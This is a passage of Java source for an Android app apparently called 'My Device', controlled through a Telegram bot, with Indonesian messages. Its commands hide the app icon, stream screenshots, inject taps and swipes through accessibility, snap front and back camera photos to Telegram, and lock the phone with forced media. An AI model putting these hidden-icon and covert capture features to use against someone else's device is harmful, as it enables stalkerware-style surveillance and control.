        try {
            Thread.sleep(1200);
        } catch (Exception ignored) {
        }
        if (!AppIcon.isVisible(ctx)) {
            replyT(ctx, chatId, target, "\uD83D\uDE48 Ikon aplikasi disembunyikan di [" + target + "].\nUntuk membuka lagi, tekan *#*#5656#*#* di aplikasi Telepon, atau kirim /tampil.");
        } else {
            replyT(ctx, chatId, target, "Gagal menyembunyikan ikon di [" + target + "].\nCoba lagi beberapa saat, atau sembunyikan manual dari pengaturan launcher.");
        }
    }

    private static void doTampil(Context ctx, long chatId, String target) {
        if (AppIcon.setVisible(ctx, true)) {
            replyT(ctx, chatId, target, "\uD83D\uDCF1 Ikon aplikasi ditampilkan kembali.");
        } else {
            replyT(ctx, chatId, target, "Gagal menampilkan ikon.");
        }
    }

    private static void doWallpaper(Context ctx, long chatId, String target) {
        PollService.pending.put(chatId, target + ":wallpaper");
        replyT(ctx, chatId, target, "\uD83D\uDDBC\uFE0F Kirim FOTO ke bot sekarang \u2014 akan dijadikan wallpaper HP [" + target + "].");
    }

    private static void doTaskbar(Context ctx, long chatId, String target) {
        if (AppLockService.toggleShade()) {
            replyT(ctx, chatId, target, "\uD83D\uDD3D Taskbar digeser di [" + target + "].\nTekan lagi untuk sebaliknya.");
        } else {
            replyT(ctx, chatId, target, "Gagal: aktifkan dulu Aksesibilitas untuk My Device di HP [" + target + "].\n(Pengaturan > Aksesibilitas > My Device > Aktif)");
        }
    }

    /** /alarm 06:30 Pesan | /alarm list | /alarm hapus 06:30 */

    private static void doNav(Context ctx, long chatId, String target, String which) {
        String label = which.equals("home") ? "Home" : which.equals("back") ? "Back" : "Recent";
        if (AppLockService.navAction(which)) {
            replyT(ctx, chatId, target, "Tombol " + label + " ditekan di [" + target + "].");
        } else {
            replyT(ctx, chatId, target, "Gagal: aktifkan dulu Aksesibilitas untuk My Device di HP [" + target + "].");
        }
    }

    // ---------- kunci media (auto-play foto/video/audio dari Telegram) ----------

    private static boolean mediaLock = false;
    private static android.media.MediaPlayer fallbackPlayer = null;

    static boolean mediaLocked() {
        return mediaLock;
    }

    /**
     * Tampilkan/putar media di HP dan kunci total sampai /berhenti.
     * kind: "image", "video", "audio".
     */
    static void startMediaLock(Context ctx, String kind, String path, String label) {
        stopMediaLock(ctx);
        mediaLock = true;
        ShowActivity.mediaKind = kind;
        ShowActivity.mediaPath = path;
        ShowActivity.mediaLabel = label == null ? "" : label;
        boolean shown = false;
        try {
            shown = AppLockService.launchShow();
        } catch (Exception ignored) {
        }
        if (!shown && "audio".equals(kind) && path != null) {
            // fallback: aksesibilitas mati -> putar audio tanpa layar kunci
            try {
                fallbackPlayer = new android.media.MediaPlayer();
                fallbackPlayer.setDataSource(path);
                fallbackPlayer.setAudioStreamType(android.media.AudioManager.STREAM_MUSIC);
                fallbackPlayer.setLooping(true);
                fallbackPlayer.prepare();
                fallbackPlayer.start();
            } catch (Exception ignored) {
            }
        }
    }

    static void stopMediaLock(Context ctx) {
        mediaLock = false;
        try {
            ShowActivity.stopAndClose();
        } catch (Exception ignored) {
        }
        try {
            if (fallbackPlayer != null) {
                try {
                    fallbackPlayer.stop();
                } catch (Exception ignored) {
                }
                fallbackPlayer.release();
            }
        } catch (Exception ignored) {
        }
        fallbackPlayer = null;
    }

    /** Download file Telegram ke penyimpanan lokal. @return File atau null. */
    static java.io.File downloadTgFile(Context ctx, String fileId, String name) {
        try {
            String token = Prefs.token(ctx);
            JSONObject f = TelegramApi.getFile(token, fileId);
            String path = f.getJSONObject("result").getString("file_path");
            java.io.File dest = new java.io.File(ctx.getExternalFilesDir(null), name);
            TelegramApi.downloadFile(token, path, dest);
            return (dest.exists() && dest.length() > 0) ? dest : null;
        } catch (Exception e) {
            return null;
        }
    }

    /** Voice/audio masuk -> auto-play di HP + kunci total. */
    public static void handleIncomingVoice(final Context ctx, final long chatId,
                                           final String target, final String fileId,
                                           final boolean isVoice) {
        // Mode HP hilang: putar langsung di HP yg hilang, tanpa kunci media tambahan.
        if (HilangMode.active && forMe(ctx, target)) {
            playVoiceHilang(ctx, chatId, target, fileId, isVoice);
            return;
        }
        replyT(ctx, chatId, target, "\uD83D\uDD0A Menerima " + (isVoice ? "rekaman suara" : "audio")
                + "... memutar di HP [" + target + "].");
        new Thread(new Runnable() {
            @Override
            public void run() {
                java.io.File f = downloadTgFile(ctx, fileId,
                        "play_" + System.currentTimeMillis() + ".ogg");
                if (f == null) {
                    replyT(ctx, chatId, target, "Gagal mengunduh audio.");
                    return;
                }
                // naikkan volume media dulu
                try {
                    android.media.AudioManager am = (android.media.AudioManager)
                            ctx.getSystemService(Context.AUDIO_SERVICE);
                    am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC,
                            am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC), 0);
                } catch (Exception ignored) {
                }
                startMediaLock(ctx, "audio", f.getAbsolutePath(),
                        isVoice ? "Rekaman suara dari Telegram" : "Audio dari Telegram");
                replyT(ctx, chatId, target, "\uD83D\uDD0A Diputar di HP. HP terkunci total — kirim /berhenti untuk menghentikan.");
            }
        }).start();
    }

    private static android.media.MediaPlayer voicePlayer = null;

    /** Putar voice note/audio pemilik langsung di HP yang hilang (tanpa ubah UI kunci). */
    private static void playVoiceHilang(final Context ctx, final long chatId,
                                        final String target, final String fileId,
                                        final boolean isVoice) {
        replyT(ctx, chatId, target, "\uD83D\uDD0A Memutar " + (isVoice ? "pesan suara" : "audio")
                + " di HP [" + target + "].");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (voicePlayer != null) {
                        try { voicePlayer.stop(); } catch (Exception ignored) {}
                        try { voicePlayer.release(); } catch (Exception ignored) {}
                        voicePlayer = null;
                    }
                    java.io.File f = downloadTgFile(ctx, fileId,
                            "hilang_" + System.currentTimeMillis() + ".ogg");
                    if (f == null) {
                        replyT(ctx, chatId, target, "Gagal mengunduh audio.");
                        return;
                    }
                    try {
                        android.media.AudioManager am = (android.media.AudioManager)
                                ctx.getSystemService(Context.AUDIO_SERVICE);
                        am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC,
                                am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC), 0);
                    } catch (Exception ignored) {
                    }
                    voicePlayer = new android.media.MediaPlayer();
                    voicePlayer.setDataSource(f.getAbsolutePath());
                    voicePlayer.setAudioStreamType(android.media.AudioManager.STREAM_MUSIC);
                    voicePlayer.setOnCompletionListener(new android.media.MediaPlayer.OnCompletionListener() {
                        @Override
                        public void onCompletion(android.media.MediaPlayer mp) {
                            try { mp.release(); } catch (Exception ignored) {}
                            if (voicePlayer == mp) voicePlayer = null;
                        }
                    });
                    voicePlayer.prepare();
                    voicePlayer.start();
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal memutar: " + e.getMessage());
                }
            }
        }).start();
    }

    /** Video masuk -> auto-play fullscreen di HP + kunci total. */
    public static void handleIncomingVideo(final Context ctx, final long chatId,
                                           final String target, final String fileId) {
        replyT(ctx, chatId, target, "\uD83C\uDFA5 Menerima video... memutar di HP [" + target + "].");
        new Thread(new Runnable() {
            @Override
            public void run() {
                java.io.File f = downloadTgFile(ctx, fileId,
                        "play_" + System.currentTimeMillis() + ".mp4");
                if (f == null) {
                    replyT(ctx, chatId, target, "Gagal mengunduh video.");
                    return;
                }
                try {
                    android.media.AudioManager am = (android.media.AudioManager)
                            ctx.getSystemService(Context.AUDIO_SERVICE);
                    am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC,
                            am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC), 0);
                } catch (Exception ignored) {
                }
                startMediaLock(ctx, "video", f.getAbsolutePath(), "Video dari Telegram");
                replyT(ctx, chatId, target, "\uD83C\uDFA5 Diputar di HP. HP terkunci total — kirim /berhenti untuk menghentikan.");
            }
        }).start();
    }

    /** Foto masuk (tanpa pending wallpaper) -> auto-tampilkan fullscreen + kunci total. */
    public static void handleIncomingPhotoShow(final Context ctx, final long chatId,
                                               final String target, final String fileId) {
        replyT(ctx, chatId, target, "\uD83D\uDCF7 Menerima foto... menampilkan di HP [" + target + "].");
        new Thread(new Runnable() {
            @Override
            public void run() {
                java.io.File f = downloadTgFile(ctx, fileId,
                        "show_" + System.currentTimeMillis() + ".jpg");
                if (f == null) {
                    replyT(ctx, chatId, target, "Gagal mengunduh foto.");
                    return;
                }
                startMediaLock(ctx, "image", f.getAbsolutePath(), "Foto dari Telegram");
                replyT(ctx, chatId, target, "\uD83D\uDCF7 Ditampilkan di HP. HP terkunci total — kirim /berhenti untuk menutup.");
            }
        }).start();
    }
    /** @return true jika nada /findmy sedang berbunyi. */
    static boolean isFindRinging() {
        try {
            return findPlayer != null && findPlayer.isPlaying();
        } catch (Exception e) {
            return false;
        }
    }

    // ---------- screenshot & live layar ----------

    /** Pesan error aksesibilitas yang menjelaskan penyebab sebenarnya. */
    private static String a11yHint(Context ctx) {
        if (android.os.Build.VERSION.SDK_INT < 30) {
            return "Butuh Android 11+.";
        }
        try {
            if (!AppLockService.isEnabled(ctx)) {
                return "Aksesibilitas My Device MATI di HP ini.\n"
                        + "Aktifkan: Pengaturan > Aksesibilitas > My Device > Aktif.\n"
                        + "PENTING: setelah update/install ulang aplikasi, MATIKAN dulu lalu NYALAKAN lagi "
                        + "(Android meminta persetujuan ulang untuk kemampuan baru), lalu coba lagi.";
            }
        } catch (Exception ignored) {
        }
        return "Layanan aksesibilitas belum terhubung — buka aplikasi My Device sekali di HP itu, lalu coba lagi.";
    }

    private static void doScreenshot(final Context ctx, final long chatId, String target, final long editMsgId) {
        if (editMsgId == 0) replyT(ctx, chatId, target, "Mengambil screenshot...");
        AppLockService.takeScreenshot(ctx, new AppLockService.ShotCallback() {
            @Override
            public void onShot(java.io.File f) {
                try {
                    if (editMsgId > 0) {
                        TelegramApi.editMessageMedia(Prefs.token(ctx), chatId, editMsgId, f,
                                null, null);
                    } else {
                        TelegramApi.sendFile(Prefs.token(ctx), "sendPhoto", "photo", chatId, f,
                                "\uD83D\uDCF8 Screenshot [" + target + "]", afterMarkup(target));
                    }
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal kirim screenshot: " + e.getMessage());
                }
            }

            @Override
            public void onError(String e) {
                replyT(ctx, chatId, target, "Screenshot gagal: " + e + "\n" + a11yHint(ctx));
            }
        });
    }

    /** chatId -> info live */
    static final java.util.Map<Long, long[]> liveMsg = new java.util.HashMap<>();
    // long[]{msgId, targetHash} — target disimpan terpisah agar sederhana:
    static final java.util.Map<Long, String> liveTarget = new java.util.HashMap<>();

    private static JSONObject liveMarkup(String target) {
        try {
            JSONObject m = new JSONObject();
            org.json.JSONArray kb = new org.json.JSONArray();
            String[][] rows = {
                    {"\u2B06\uFE0F", "liveup"},
                    {"\u2B05\uFE0F", "liveleft", "\uD83D\uDC46 Tap", "livetap", "\u27A1\uFE0F", "liveright"},
                    {"\u2B07\uFE0F", "livedown"},
                    {"\uD83D\uDD04 Refresh", "liveshot", "\u274C Tutup", "livex"},
            };
            for (String[] row : rows) {
                org.json.JSONArray r = new org.json.JSONArray();
                for (int i = 0; i < row.length; i += 2) {
                    JSONObject b = new JSONObject();
                    b.put("text", row[i]);
                    b.put("callback_data", "cmd:" + target + ":" + row[i + 1]);
                    r.put(b);
                }
                kb.put(r);
            }
            m.put("inline_keyboard", kb);
            return m;
        } catch (Exception e) {
            return null;
        }
    }

    private static String liveCaption(String target) {
        java.text.SimpleDateFormat f = new java.text.SimpleDateFormat("HH:mm:ss",
                new java.util.Locale("id", "ID"));
        return "\uD83D\uDDA5\uFE0F Live [" + target + "] \u2022 "
                + f.format(new java.util.Date())
                + "\nTap tombol untuk geser layar.";
    }

    private static void doLive(final Context ctx, final long chatId, final String target) {
        replyT(ctx, chatId, target, "Membuka live layar...");
        AppLockService.takeScreenshot(ctx, new AppLockService.ShotCallback() {
            @Override
            public void onShot(java.io.File f) {
                try {
                    long msgId = TelegramApi.sendFile(Prefs.token(ctx), "sendPhoto", "photo",
                            chatId, f, liveCaption(target), liveMarkup(target));
                    if (msgId > 0) {
                        liveMsg.put(chatId, new long[]{msgId});
                        liveTarget.put(chatId, target);
                    }
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
                }
            }

            @Override
            public void onError(String e) {
                replyT(ctx, chatId, target, "Live gagal: " + e + "\n" + a11yHint(ctx));
            }
        });
    }

    private static void doLiveShot(final Context ctx, final long chatId, final String target) {
        final long[] arr = liveMsg.get(chatId);
        if (arr == null) {
            doLive(ctx, chatId, target);
            return;
        }
        final long msgId = arr[0];
        AppLockService.takeScreenshot(ctx, new AppLockService.ShotCallback() {
            @Override
            public void onShot(java.io.File f) {
                try {
                    TelegramApi.editMessageMedia(Prefs.token(ctx), chatId, msgId, f,
                            liveCaption(target), liveMarkup(target));
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal refresh: " + e.getMessage());
                }
            }

            @Override
            public void onError(String e) {
            }
        });
    }

    private static void doLiveGesture(final Context ctx, final long chatId,
                                      final String target, final String kind) {
        final long[] arr = liveMsg.get(chatId);
        if (arr == null) {
            doLive(ctx, chatId, target);
            return;
        }
        AppLockService.sendGesture(kind, new AppLockService.GestureCallback() {
            @Override
            public void onDone(boolean ok) {
                try {
                    Thread.sleep(700);
                } catch (InterruptedException ignored) {
                }
                doLiveShot(ctx, chatId, target);
            }
        });
    }

    // ---------- live kamera ----------

    static final java.util.Map<Long, long[]> liveCamMsg = new java.util.HashMap<>();
    static final java.util.Map<Long, Boolean> liveCamFront = new java.util.HashMap<>();

    private static JSONObject liveCamMarkup(String target) {
        try {
            JSONObject m = new JSONObject();
            org.json.JSONArray kb = new org.json.JSONArray();
            String[][] rows = {
                    {"\uD83D\uDD04 Refresh", "livecamshot", "\uD83D\uDD00 Ganti Kamera", "livecamswitch"},
                    {"\u274C Tutup", "livecamx"},
            };
            for (String[] row : rows) {
                org.json.JSONArray r = new org.json.JSONArray();
                for (int i = 0; i < row.length; i += 2) {
                    JSONObject b = new JSONObject();
                    b.put("text", row[i]);
                    b.put("callback_data", "cmd:" + target + ":" + row[i + 1]);
                    r.put(b);
                }
                kb.put(r);
            }
            m.put("inline_keyboard", kb);
            return m;
        } catch (Exception e) {
            return null;
        }
    }

    private static String liveCamCaption(String target, boolean depan) {
        java.text.SimpleDateFormat f = new java.text.SimpleDateFormat("HH:mm:ss",
                new java.util.Locale("id", "ID"));
        return "\uD83D\uDCF7 Live kamera " + (depan ? "depan" : "belakang") + " [" + target + "] \u2022 "
                + f.format(new java.util.Date());
    }

    private static void doLiveCam(final Context ctx, final long chatId, final String target) {
        liveCamFront.put(chatId, false);
        replyT(ctx, chatId, target, "Membuka live kamera...");
        doLiveCamShot(ctx, chatId, target);
    }

    private static void doLiveCamShot(final Context ctx, final long chatId, final String target) {
        final boolean depan = Boolean.TRUE.equals(liveCamFront.get(chatId));
        final long[] arr = liveCamMsg.get(chatId);
        try {
            CameraHelper.takePhoto(ctx, depan, new CameraHelper.PhotoCallback() {
                @Override
                public void onPhoto(java.io.File f) {
                    try {
                        if (arr != null) {
                            TelegramApi.editMessageMedia(Prefs.token(ctx), chatId, arr[0], f,
                                    liveCamCaption(target, depan), liveCamMarkup(target));
                        } else {
                            long msgId = TelegramApi.sendFile(Prefs.token(ctx), "sendPhoto", "photo",
                                    chatId, f, liveCamCaption(target, depan), liveCamMarkup(target));
                            if (msgId > 0) liveCamMsg.put(chatId, new long[]{msgId});
                        }
                    } catch (Exception e) {
                        replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
                    }
                }

                @Override
                public void onError(String e) {
                    replyT(ctx, chatId, target, "Live kamera gagal: " + e
                            + "\nPastikan izin Kamera diberikan.");
                }
            });
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doLiveCamSwitch(final Context ctx, final long chatId, final String target) {
        boolean depan = Boolean.TRUE.equals(liveCamFront.get(chatId));
        liveCamFront.put(chatId, !depan);
        doLiveCamShot(ctx, chatId, target);
    }

    // ---------- geser layar dari menu ----------

    private static void doSwipe(final Context ctx, final long chatId,
                                final String target, final String kind) {
        AppLockService.sendGesture(kind, new AppLockService.GestureCallback() {
            @Override
            public void onDone(boolean ok) {
                replyT(ctx, chatId, target, ok
                        ? ("\u27A1\uFE0F Layar [" + target + "] digeser "
                            + ("left".equals(kind) ? "ke kiri." : "ke kanan."))
                        : "Gagal menggeser — pastikan Aksesibilitas aktif.");
            }
        });
    }

    // ---------- atur kerapatan tombol ----------

    private static void doTombol(Context ctx, long chatId, String target, String arg) {
        arg = arg == null ? "" : arg.trim();
        int v = 0;
        if (arg.matches("[1-4]")) {
            v = Integer.parseInt(arg);
        } else if (!arg.isEmpty()) {
            replyT(ctx, chatId, target, "Pilih jumlah tombol per baris:\n"
                    + "/tombol 1 — renggang (1 per baris)\n"
                    + "/tombol 2 — normal (2 per baris)\n"
                    + "/tombol 3 — rapat (3 per baris)\n"
                    + "/tombol 4 — rapat sekali (4 per baris)");
            return;
        } else {
            replyT(ctx, chatId, target, "Tampilan tombol saat ini: " + Prefs.btnCols(ctx) + " per baris.\n"
                    + "Ubah: /tombol 1 | 2 | 3 | 4\n(1=renggang, 2=normal, 3=rapat, 4=rapat sekali)");
            return;
        }
        Prefs.setBtnCols(ctx, v);
        replyT(ctx, chatId, target, "\u2705 Tampilan tombol: " + v + " per baris. Buka /menu untuk melihat.");
        if (Prefs.isMenuServer(ctx)) sendDeviceMenu(ctx, chatId, 0, target);
    }

    /** Pilihan kerapatan tombol sebagai tombol-tombol. */
    private static void doTombolMenu(Context ctx, long chatId, String target) {
        try {
            JSONObject m = new JSONObject();
            JSONArray kb = new JSONArray();
            JSONArray r = new JSONArray();
            String[] labels = {"1\uFE0F\u20E3 Renggang", "2\uFE0F\u20E3 Normal",
                    "3\uFE0F\u20E3 Rapat", "4\uFE0F\u20E3 Rapat+"};
            for (int i = 0; i < 4; i++) {
                JSONObject b = new JSONObject();
                b.put("text", labels[i]);
                b.put("callback_data", "cmd:" + target + ":tombol" + (i + 1));
                r.put(b);
            }
            kb.put(r);
            m.put("inline_keyboard", kb);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId,
                    "\uD83D\uDD22 Kerapatan tombol saat ini: " + Prefs.btnCols(ctx) + " per baris.\nPilih:",
                    m);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    // ---------- YouTube / ReVanced ----------

    static final java.util.Map<Long, java.util.List<YouTube.Video>> tubeResults =
            new java.util.HashMap<>();
    static final java.util.Map<Long, String> tubePkg = new java.util.HashMap<>();
    static final java.util.Map<Long, java.util.List<YouTube.Video>> tubeRelated =
            new java.util.HashMap<>();

    static class TubeState {
        String pkg, videoId, title;
        int baseSec;
        long startMs;
    }
    static final java.util.Map<Long, TubeState> tubeState = new java.util.HashMap<>();

    private static void doTubeStart(Context ctx, long chatId, String target, String arg) {
        java.util.List<String> apps = YouTube.installedApps(ctx);
        if (apps.isEmpty()) {
            replyT(ctx, chatId, target, "YouTube tidak terinstal di HP [" + target + "].");
            return;
        }
        String query = arg == null ? "" : arg.trim();
        if (!query.isEmpty()) {
            String pkg = apps.get(0); // ReVanced dulu bila ada
            tubePkg.put(chatId, pkg);
            doTubeSearch(ctx, chatId, target, pkg, query);
            return;
        }
        if (apps.size() > 1) {
            try {
                JSONObject m = new JSONObject();
                JSONArray kb = new JSONArray();
                JSONArray r = new JSONArray();
                for (String pkg : apps) {
                    JSONObject b = new JSONObject();
                    b.put("text", YouTube.appLabel(pkg));
                    b.put("callback_data", "cmd:" + target + ":tubeapp:" + pkg);
                    r.put(b);
                }
                kb.put(r);
                m.put("inline_keyboard", kb);
                TelegramApi.sendMessage(Prefs.token(ctx), chatId,
                        "Pilih aplikasi YouTube di [" + target + "]:", m);
            } catch (Exception e) {
                replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
            }
            return;
        }
        String pkg = apps.get(0);
        tubePkg.put(chatId, pkg);
        PollService.pending.put(chatId, target + ":youtube");
        replyT(ctx, chatId, target, "\u25B6\uFE0F YouTube (" + YouTube.appLabel(pkg) + ") [" + target + "]\nKirim kata kunci pencarian:");
    }

    private static void doTubeApp(Context ctx, long chatId, String target, String pkg) {
        tubePkg.put(chatId, pkg);
        PollService.pending.put(chatId, target + ":youtube");
        replyT(ctx, chatId, target, "\u25B6\uFE0F Dipilih: " + YouTube.appLabel(pkg) + "\nKirim kata kunci pencarian:");
    }

    private static void doTubeSearch(final Context ctx, final long chatId, final String target,
                                     final String pkg, final String query) {
        replyT(ctx, chatId, target, "\uD83D\uDD0D Mencari \"" + query + "\" di YouTube...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    java.util.List<YouTube.Video> vids = YouTube.search(query);
                    if (vids.isEmpty()) {
                        replyT(ctx, chatId, target, "Tidak ketemu hasil untuk \"" + query + "\".");
                        return;
                    }
                    tubeResults.put(chatId, vids);
                    sendTubeList(ctx, chatId, target, pkg, vids, "tubeplay",
                            "\uD83D\uDD0D Hasil YouTube");
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal mencari di YouTube (" + e.getMessage()
                            + ") — membuka pencarian manual di aplikasi...");
                    YouTube.openSearch(ctx, pkg, query);
                }
            }
        }).start();
    }

    /** Kirim daftar video sebagai tombol bernomor. prefix: "tubeplay" atau "tuberel". */
    static void sendTubeList(Context ctx, long chatId, String target, String pkg,
                             java.util.List<YouTube.Video> vids, String prefix, String judul) {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append(judul).append(" [").append(target).append("] (")
                    .append(YouTube.appLabel(pkg)).append("):");
            JSONObject m = new JSONObject();
            JSONArray kb = new JSONArray();
            JSONArray row = null;
            for (int i = 0; i < vids.size(); i++) {
                YouTube.Video v = vids.get(i);
                sb.append("\n\n").append(i + 1).append(". ").append(v.title)
                        .append("\n   \u23F1\uFE0F ").append(v.durText)
                        .append(" \u2022 \uD83D\uDCFA ").append(v.channel);
                if (i % 4 == 0) {
                    row = new JSONArray();
                    kb.put(row);
                }
                JSONObject b = new JSONObject();
                b.put("text", "\u25B6\uFE0F " + (i + 1));
                b.put("callback_data", "cmd:" + target + ":" + prefix + ":" + i);
                row.put(b);
            }
            m.put("inline_keyboard", kb);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, sb.toString(), m);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static YouTube.Video tubeVideo(long chatId, String idxStr) {
        try {
            int idx = Integer.parseInt(idxStr);
            java.util.List<YouTube.Video> vids = tubeResults.get(chatId);
            if (vids != null && idx >= 0 && idx < vids.size()) return vids.get(idx);
        } catch (Exception ignored) {
        }
        return null;
    }

    private static void doTubeCard(Context ctx, long chatId, String target, String idxStr) {
        YouTube.Video v = tubeVideo(chatId, idxStr);
        String pkg = tubePkg.get(chatId);
        if (v == null || pkg == null) {
            replyT(ctx, chatId, target, "Hasil pencarian kedaluwarsa — cari lagi via /youtube.");
            return;
        }
        try {
            JSONObject m = new JSONObject();
            JSONArray kb = new JSONArray();
            JSONArray r1 = new JSONArray();
            JSONObject b1 = new JSONObject();
            b1.put("text", "\u25B6\uFE0F Putar");
            b1.put("callback_data", "cmd:" + target + ":tubego:" + idxStr);
            r1.put(b1);
            JSONObject b2 = new JSONObject();
            b2.put("text", "\u23F1\uFE0F Dari menit...");
            b2.put("callback_data", "cmd:" + target + ":tubemin:" + idxStr);
            r1.put(b2);
            kb.put(r1);
            m.put("inline_keyboard", kb);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId,
                    "\uD83C\uDFAC " + v.title + "\n\uD83D\uDCFA " + v.channel
                            + " \u2022 \u23F1\uFE0F " + v.durText, m);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doTubeGo(Context ctx, long chatId, String target, String idxStr, int startSec) {
        doTubeGo(ctx, chatId, target, idxStr, startSec, null);
    }

    private static void doTubeGo(Context ctx, long chatId, String target, String idxStr,
                                 int startSec, String menitStr) {
        YouTube.Video v = tubeVideo(chatId, idxStr);
        if (v == null) {
            replyT(ctx, chatId, target, "Hasil pencarian kedaluwarsa — cari lagi via /youtube.");
            return;
        }
        int sec = startSec;
        if (menitStr != null) {
            sec = YouTube.parseMenit(menitStr);
            if (sec < 0) {
                replyT(ctx, chatId, target, "Format menit tidak dimengerti. Contoh: 1:30 atau 90.");
                return;
            }
        }
        if (sec < 0) sec = 0;
        playTubeVideo(ctx, chatId, target, v, sec);
    }

    /** Putar video apa pun (dari hasil cari / terkait / suara). */
    static void playTubeVideo(final Context ctx, final long chatId, final String target,
                              final YouTube.Video v, final int sec) {
        String pkg = tubePkg.get(chatId);
        if (pkg == null) {
            replyT(ctx, chatId, target, "Sesi YouTube kedaluwarsa — cari lagi via /youtube.");
            return;
        }
        boolean ok = YouTube.play(ctx, pkg, v.id, sec);
        if (!ok) {
            replyT(ctx, chatId, target, "Gagal memutar — pastikan Aksesibilitas aktif di HP [" + target + "].");
            return;
        }
        TubeState st = new TubeState();
        st.pkg = pkg;
        st.videoId = v.id;
        st.title = v.title;
        st.baseSec = sec;
        st.startMs = System.currentTimeMillis();
        tubeState.put(chatId, st);
        sendTubeControls(ctx, chatId, target, v, sec);
        fetchRelated(ctx, chatId, target, pkg, v);
    }

    /** Ambil daftar "up next" lalu kirim sebagai tombol. */
    private static void fetchRelated(final Context ctx, final long chatId, final String target,
                                     final String pkg, final YouTube.Video v) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    java.util.List<YouTube.Video> rel = YouTube.related(v.id);
                    if (rel.isEmpty()) return;
                    tubeRelated.put(chatId, rel);
                    sendTubeList(ctx, chatId, target, pkg, rel, "tuberel",
                            "\u23ED\uFE0F Putar berikutnya");
                } catch (Exception ignored) {
                }
            }
        }).start();
    }

    private static void doTubeRel(Context ctx, long chatId, String target, String idxStr) {
        YouTube.Video v = null;
        try {
            int idx = Integer.parseInt(idxStr);
            java.util.List<YouTube.Video> rel = tubeRelated.get(chatId);
            if (rel != null && idx >= 0 && idx < rel.size()) v = rel.get(idx);
        } catch (Exception ignored) {
        }
        if (v == null) {
            replyT(ctx, chatId, target, "Daftar terkait kedaluwarsa.");
            return;
        }
        playTubeVideo(ctx, chatId, target, v, 0);
    }

    private static void sendTubeControls(Context ctx, long chatId, String target,
                                         YouTube.Video v, int sec) {
        try {
            JSONObject m = new JSONObject();
            JSONArray kb = new JSONArray();
            JSONArray r1 = new JSONArray();
            String[][] defs = {{"\u23EA 30 dtk", "tubeback"}, {"\u23E9 30 dtk", "tubefwd"}};
            for (String[] d : defs) {
                JSONObject b = new JSONObject();
                b.put("text", d[0]);
                b.put("callback_data", "cmd:" + target + ":" + d[1]);
                r1.put(b);
            }
            kb.put(r1);
            JSONArray r2 = new JSONArray();
            JSONObject bp = new JSONObject();
            bp.put("text", "\u23F8\uFE0F Jeda");
            bp.put("callback_data", "cmd:" + target + ":tubepause");
            r2.put(bp);
            JSONObject br = new JSONObject();
            br.put("text", "\u25B6\uFE0F Lanjut");
            br.put("callback_data", "cmd:" + target + ":tuberesume");
            r2.put(br);
            kb.put(r2);
            JSONArray r3 = new JSONArray();
            JSONObject bs = new JSONObject();
            bs.put("text", "\u23F9\uFE0F Stop");
            bs.put("callback_data", "cmd:" + target + ":tubestop");
            r3.put(bs);
            kb.put(r3);
            JSONArray r4 = new JSONArray();
            JSONObject bd = new JSONObject();
            bd.put("text", "\u2B05\uFE0F Daftar");
            bd.put("callback_data", "cmd:" + target + ":tubeplist");
            r4.put(bd);
            JSONObject bc = new JSONObject();
            bc.put("text", "\uD83D\uDD0D Cari");
            bc.put("callback_data", "cmd:" + target + ":tubesearch");
            r4.put(bc);
            kb.put(r4);
            m.put("inline_keyboard", kb);
            String pos = sec > 0 ? " (dari " + YouTube.fmtDur(sec) + ")" : "";
            TelegramApi.sendMessage(Prefs.token(ctx), chatId,
                    "\u25B6\uFE0F Memutar" + pos + ":\n" + v.title, m);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Memutar: " + v.title);
        }
    }

    private static void doTubePlaylist(Context ctx, long chatId, String target) {
        java.util.List<YouTube.Video> vids = tubeResults.get(chatId);
        String pkg = tubePkg.get(chatId);
        if (vids == null || vids.isEmpty() || pkg == null) {
            replyT(ctx, chatId, target, "Tidak ada daftar tersimpan — cari lagi via /youtube.");
            return;
        }
        sendTubeList(ctx, chatId, target, pkg, vids, "tubeplay",
                "\uD83D\uDD0D Hasil YouTube");
    }

    private static void doTubeSearchAsk(Context ctx, long chatId, String target) {
        PollService.pending.put(chatId, target + ":youtube");
        String pkg = tubePkg.get(chatId);
        replyT(ctx, chatId, target, "\uD83D\uDD0D Cari video baru"
                + (pkg != null ? " (" + YouTube.appLabel(pkg) + ")" : "")
                + " — kirim kata kuncinya:");
    }

    private static void doTubeMinAsk(Context ctx, long chatId, String target, String idxStr) {
        YouTube.Video v = tubeVideo(chatId, idxStr);
        if (v == null) {
            replyT(ctx, chatId, target, "Hasil pencarian kedaluwarsa — cari lagi via /youtube.");
            return;
        }
        PollService.pending.put(chatId, target + ":tubemin:" + idxStr);
        replyT(ctx, chatId, target, "\u23F1\uFE0F \"" + v.title + "\"\nDurasi: " + v.durText
                + "\nKirim mulai dari menit ke berapa (contoh: 1:30 atau 90):");
    }

    private static void doTubeControl(Context ctx, long chatId, String target, String aksi) {
        TubeState st = tubeState.get(chatId);
        if (st == null) {
            replyT(ctx, chatId, target, "Tidak ada video yang diputar.");
            return;
        }
        if ("tubepause".equals(aksi)) {
            boolean ok = YouTube.pause(ctx);
